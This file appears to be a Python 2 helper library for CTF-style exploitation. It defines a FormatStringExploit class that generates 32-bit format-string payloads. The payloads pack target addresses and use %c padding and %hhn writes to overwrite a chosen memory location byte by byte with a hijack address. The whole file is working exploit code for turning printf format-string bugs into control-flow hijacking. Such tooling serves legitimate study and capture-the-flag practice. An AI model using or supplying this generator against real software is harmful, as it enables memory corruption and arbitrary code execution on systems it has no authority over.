import struct

p32 = lambda x : struct.pack('<L', x)
p64 = lambda x : struct.pack('<Q', x)
get_byte = lambda x : (x[0], x[1] & 0xff)

class FormatStringExploit:
    printed = 0
    def __init__(self, offset=0, printed=0, hijack_target=None, hijack_address=None):
        self.offset = offset
        self.hijack_target = hijack_target
        self.hijack_address = hijack_address
        FormatStringExploit.printed += printed

    def generate32(self):

        # Arrange size of addres per byte for optimization
        adr = [(i, self.hijack_address >> 8 * i) for i in xrange(4)]
        adr = sorted(map(get_byte, adr), key=lambda x : (x[1] - 16) & 0xff)

        # Start generate payload
        payload = ''.join(p32(self.hijack_target + i[0]) for i in adr)
        FormatStringExploit.printed += 16
        for idx, i in enumerate(adr):
            byte = i[1]
            pad = ((byte - FormatStringExploit.printed) % 256 + 256) % 256
            if pad > 0:
                payload += "%%%dc" % (pad)
            payload += "%%%d$hhn" % (self.offset + idx)
            FormatStringExploit.printed += pad
        return payload

    def size(self):
        # Return already printed words
        return FormatStringExploit.printed